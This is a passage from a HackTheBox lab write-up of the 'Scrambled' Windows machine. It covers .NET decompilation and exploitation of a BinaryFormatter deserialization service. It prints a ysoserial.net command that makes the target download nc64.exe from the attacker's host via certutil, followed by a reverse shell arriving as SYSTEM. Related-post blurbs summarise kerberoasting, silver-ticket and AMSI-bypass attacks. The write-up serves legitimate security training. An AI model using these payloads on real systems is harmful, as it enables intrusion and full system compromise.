<p>From this we can load both the exe and dll. The dll will hold libraries which we can look at called <code>ScrambleLib</code>. Inside them we find a library showing us a certain username we can use to bypass authentication.<br><img src="/img/dnspy.png"></p>
<p>Upon connecting with the domain we get the dashboard. Other tabs show a way to create a new order. We can enable debug logging from Tools so we get a output file we can read. Lets try to create an order and get output.</p>
<p><img src="/img/mainm.png"><br><img src="/img/debug1.png"><br><img src="/img/exe1.png"><br><img src="/img/neworder.png"></p>
<h3 id="Making-sense-of-the-output"><a href="#Making-sense-of-the-output" class="headerlink" title="Making sense of the output"></a>Making sense of the output</h3><p>We see that we are send data to the server <code>LIST_ORDERS;</code>. Also base64 and deserialization is being used, as well as Binary Formatting. We see near the bottom, <code>UPLOAD_ORDER;</code> and then base64. If we rememeber from the very beginning there was port 4411 running that gave us feedback.<br><img src="/img/deout.png"></p>
<h2 id="Back-to-Suite-4411-with-Deserialization"><a href="#Back-to-Suite-4411-with-Deserialization" class="headerlink" title="Back to Suite 4411 with Deserialization"></a>Back to Suite 4411 with Deserialization</h2><p><img src="/img/serial.gif"><br>We can use <a target="_blank" rel="noopener" href="https://github.com/pwntester/ysoserial.net">ysoserial</a> to encode our payloads. First we can setup a python server hosting ncat.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Windows VM:</span><br><span class="line">PS C:\Users\jay\Desktop\Tools\ysoserial-NET &gt; .\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c &quot;certutil -f -urlcache http://10.10.14.7/nc64.exe C:\ProgramData\nc.exe&quot;</span><br><span class="line"></span><br><span class="line">Linux VM:</span><br><span class="line">$ telnet 10.10.11.168 4411                                               </span><br><span class="line">Trying 10.10.11.168...</span><br><span class="line">Connected to 10.10.11.168.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">SCRAMBLECORP_ORDERS_V1.0.3;</span><br><span class="line">UPLOAD_ORDER;AAEAAAD/////&lt;SNIP&gt;</span><br><span class="line">ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.</span><br><span class="line">SESSION_TIMED_OUT;</span><br><span class="line"></span><br><span class="line">$ sudo python3 -m http.server 80 --directory /usr/share/windows-binaries/</span><br><span class="line">[sudo] password for jaybit:</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">10.10.11.168 - - [01/Apr/2025 10:43:28] &quot;GET /nc64.exe HTTP/1.1&quot; 200 -</span><br><span class="line">10.10.11.168 - - [01/Apr/2025 10:43:28] &quot;GET /nc64.exe HTTP/1.1&quot; 200 - </span><br></pre></td></tr></table></figure>
<p><img src="/img/great.gif"><br>So we got it to grab ncat. Now we can do the same thing and execute ncat now and once we do we get a shell back.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ rlwrap nc -lvnp 9001                                                                                            </span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.14.7] from (UNKNOWN) [10.10.11.168] 50224</span><br><span class="line">Windows PowerShell                                          </span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system           </span><br></pre></td></tr></table></figure>

<p><img src="/img/robocop.gif"></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SMB/">SMB</a><a class="post-meta__tags" href="/tags/kerberoasting-SPNs/">kerberoasting SPNs</a><a class="post-meta__tags" href="/tags/silver-ticket/">silver ticket</a><a class="post-meta__tags" href="/tags/mssql/">mssql</a><a class="post-meta__tags" href="/tags/NET/">.NET</a><a class="post-meta__tags" href="/tags/Source-Code-Analysis/">Source Code Analysis</a><a class="post-meta__tags" href="/tags/Deserialization/">Deserialization</a></div><div class="post-share"><div class="social-share" data-image="/img/scrambled.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/03/28/Breach/" title="Breach (Windows Medium)"><img class="cover" src="/img/breach.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Breach (Windows Medium)</div></div><div class="info-2"><div class="info-item-1">Breach is a Windows Medium box that starts with Guest auth to shares. Having read&#x2F;write to one share, we upload a lnk file and receive and user hash. This has is used to kerberoast SPNs which gets a hash for svc_mssql user. As we have a Service Account, we can create a silver ticket. After creation, we connect as Administrator and can run commands via xp_cmdshell. Only after bypassing AMSI do you get a reverse shell. Once on the machine, checking our privileges we have SeImpersonate available to us. Using GodPotato we create a user and add them to the Administrators group, and connect as Admin via evil-winrm. Initial Nmap12345678910111213141516PORT     STATE SERVICE       REASON          VERSION53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.088/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-28 00:08:14Z)135/tcp  open  msrpc         syn-ack ttl 127...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/03/05/Cascade/" title="Cascade (Windows Medium)"><img class="cover" src="/img/cascade.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-05</div><div class="info-item-2">Cascade (Windows Medium)</div></div><div class="info-2"><div class="info-item-1">Cascade is a medium difficulty Windows machine configured as a Domain Controller. LDAP anonymous binds are enabled, and enumeration yields the password for user r.thompson, which gives access to a TightVNC registry backup. The backup is decrypted to gain the password for s.smith. This user has access to a .NET executable, which after decompilation and source code analysis reveals the password for the ArkSvc account. This account belongs to the AD Recycle Bin group, and is able to view deleted Active Directory objects. One of the deleted user accounts is found to contain a hardcoded password, which can be reused to login as the primary domain administrator.  Initial Nmap1234567891011121314151617181920PORT      STATE SERVICE       REASON          VERSION53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)| dns-nsid:|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows...</div></div></div></a><a class="pagination-related" href="/2025/03/28/Breach/" title="Breach (Windows Medium)"><img class="cover" src="/img/breach.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-28</div><div class="info-item-2">Breach (Windows Medium)</div></div><div class="info-2"><div class="info-item-1">Breach is a Windows Medium box that starts with Guest auth to shares. Having read&#x2F;write to one share, we upload a lnk file and receive and user hash. This has is used to kerberoast SPNs which gets a hash for svc_mssql user. As we have a Service Account, we can create a silver ticket. After creation, we connect as Administrator and can run commands via xp_cmdshell. Only after bypassing AMSI do you get a reverse shell. Once on the machine, checking our privileges we have SeImpersonate available to us. Using GodPotato we create a user and add them to the Administrators group, and connect as Admin via evil-winrm. Initial Nmap12345678910111213141516PORT     STATE SERVICE       REASON          VERSION53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.088/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-28 00:08:14Z)135/tcp  open  msrpc         syn-ack ttl 127...</div></div></div></a><a class="pagination-related" href="/2024/11/07/Retro/" title="Retro (Windows Easy)"><img class="cover" src="/img/retro.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-07</div><div class="info-item-2">Retro (Windows Easy)</div></div><div class="info-2"><div class="info-item-1">Retro is a box working around pre-created windows 2000 machines. Pre-creating a computer means adding a computer to AD without using it to join a host to the domain right away, it just gets used later. There is a “Pre-Windows 2000” compatibility option that can be selected when creating a computer from ADUC, still present in Windows Server 2022. A computer created with this option will have a password equal to the computers name in lowercase without the ‘$’. This allows you to look at ADCS templates being used that are vulnerable, which leads to privilege escalation to Administrator. Resource from Medium Initial Nmap123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293# Nmap 7.94SVN scan initiated Wed Nov  6 22:09:30 2024 as: /usr/lib/nmap/nmap -v -sVC -oN Evidence/Scans/initial.log 10.10.111.122Nmap scan report for 10.10.111.122Host is up (0.17s latency).Not...</div></div></div></a><a class="pagination-related" href="/2025/02/24/blackfield/" title="Blackfield (Windows Hard)"><img class="cover" src="/img/blackfield.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-24</div><div class="info-item-2">Blackfield (Windows Hard)</div></div><div class="info-2"><div class="info-item-1">Backfield is a hard difficulty Windows machine featuring Windows and Active Directory misconfigurations. Anonymous &#x2F; Guest access to an SMB share is used to enumerate users. Once user is found to have Kerberos pre-authentication disabled, which allows us to conduct an ASREPRoasting attack. This allows us to retrieve a hash of the encrypted material contained in the AS-REP, which can be subjected to an offline brute force attack in order to recover the plaintext password. With this user we can access an SMB share containing forensics artefacts, including an lsass process dump. This contains a username and a password for a user with WinRM privileges, who is also a member of the Backup Operators group. The privileges conferred by this privileged group are used to dump the Active Directory database, and retrieve the hash of the primary domain administrator.  Nmap1234567891011121314PORT      STATE SERVICE       REASON          VERSION53/tcp    open  domain        syn-ack ttl 127...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Jay</div><div class="author-info-description">Ethical Hacker | CTF Player</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/itzgottabejay" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/ianberdahl/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #24292e;"></i></a><a class="social-icon" href="https://app.hackthebox.com/profile/420575" target="_blank" title="HackTheBox"><i class="fab fa-htb" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I do writesup for myself, but you can see them too.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Nmap"><span class="toc-number">1.</span> <span class="toc-text">Initial Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-4411"><span class="toc-number">2.</span> <span class="toc-text">Port 4411</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP"><span class="toc-number">3.</span> <span class="toc-text">HTTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Authenticating-Through-Kerberos"><span class="toc-number">4.</span> <span class="toc-text">SMB (Authenticating Through Kerberos)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberoasting-cuz-We-care"><span class="toc-number">5.</span> <span class="toc-text">Kerberoasting cuz We care!!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Silver-Ticket-Attacks"><span class="toc-number">6.</span> <span class="toc-text">Silver Ticket Attacks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL-Through-the-Looking-Glass"><span class="toc-number">7.</span> <span class="toc-text">MSSQL (Through the Looking Glass)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-I-See"><span class="toc-number">8.</span> <span class="toc-text">SMB I See</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dnspying"><span class="toc-number">9.</span> <span class="toc-text">Dnspying</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Making-sense-of-the-output"><span class="toc-number">9.1.</span> <span class="toc-text">Making sense of the output</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Back-to-Suite-4411-with-Deserialization"><span class="toc-number">10.</span> <span class="toc-text">Back to Suite 4411 with Deserialization</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/04/01/Scrambled/" title="Scrambled (Windows Medium)"><img src="/img/scrambled.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Scrambled (Windows Medium)"/></a><div class="content"><a class="title" href="/2025/04/01/Scrambled/" title="Scrambled (Windows Medium)">Scrambled (Windows Medium)</a><time datetime="2025-04-01T14:14:37.000Z" title="Created 2025-04-01 09:14:37">2025-04-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/28/Breach/" title="Breach (Windows Medium)"><img src="/img/breach.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Breach (Windows Medium)"/></a><div class="content"><a class="title" href="/2025/03/28/Breach/" title="Breach (Windows Medium)">Breach (Windows Medium)</a><time datetime="2025-03-28T16:42:53.000Z" title="Created 2025-03-28 11:42:53">2025-03-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/14/Cypher/" title="Cypher (Linux Medium)"><img src="/img/cypher.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cypher (Linux Medium)"/></a><div class="content"><a class="title" href="/2025/03/14/Cypher/" title="Cypher (Linux Medium)">Cypher (Linux Medium)</a><time datetime="2025-03-14T15:13:45.000Z" title="Created 2025-03-14 10:13:45">2025-03-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/05/Cascade/" title="Cascade (Windows Medium)"><img src="/img/cascade.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cascade (Windows Medium)"/></a><div class="content"><a class="title" href="/2025/03/05/Cascade/" title="Cascade (Windows Medium)">Cascade (Windows Medium)</a><time datetime="2025-03-05T20:03:31.000Z" title="Created 2025-03-05 14:03:31">2025-03-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/24/blackfield/" title="Blackfield (Windows Hard)"><img src="/img/blackfield.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Blackfield (Windows Hard)"/></a><div class="content"><a class="title" href="/2025/02/24/blackfield/" title="Blackfield (Windows Hard)">Blackfield (Windows Hard)</a><time datetime="2025-02-24T18:28:33.000Z" title="Created 2025-02-24 12:28:33">2025-02-24</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/n8.jpg);"><div id="footer-wrap"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="H4CK,TH3,PL4N3T" data-fontsize="21px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>